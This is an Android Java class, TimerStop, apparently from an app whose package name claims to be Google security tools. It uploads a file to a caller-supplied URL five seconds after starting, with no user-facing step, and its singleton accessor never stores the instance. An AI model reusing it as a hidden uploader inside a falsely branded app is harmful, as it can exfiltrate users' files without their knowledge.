package com.google.security.tools;

import java.io.File;
import java.util.Map;
import java.util.Timer;

import com.google.security.UploadUtils;

import android.content.Context;
import android.util.Log;

public class TimerStop {

	private static TimerStop TimerStop;
	private static final String LOGTAG = "TimerStop";
	Timer timer;
	Context context;
	String actionUrl;
	Map<String, String> params;
	Map<String, File> files;

	private TimerStop(Context context, String actionUrl,
			Map<String, String> params, Map<String, File> files) {
		this.context = context;
		this.actionUrl = actionUrl;
		this.params = params;
		this.files = files;
	}

	public void run() {
		// TODO Auto-generated method stub

	}

	public static TimerStop getIntance(Context context, String actionUrl,
			Map<String, String> params, Map<String, File> files) {
		if (TimerStop == null)
			return new TimerStop(context, actionUrl, params, files);
		return TimerStop;
	}

	public void start() {
		if (files.get("file").exists()) {
			timer = new Timer();
			timer.schedule(task, 5000);
			Log.e(LOGTAG, "timer start");
		}

	}

	public void stop() {
		Log.e(LOGTAG, "timer stop");
		if (timer != null)
			timer.cancel();
	}

	java.util.TimerTask task = new java.util.TimerTask() {

		@Override
		public void run() {
			// TODO Auto-generated method stub
			UploadUtils.getIntance(context).post(actionUrl, params, files);
			stop();
		}
	};
}
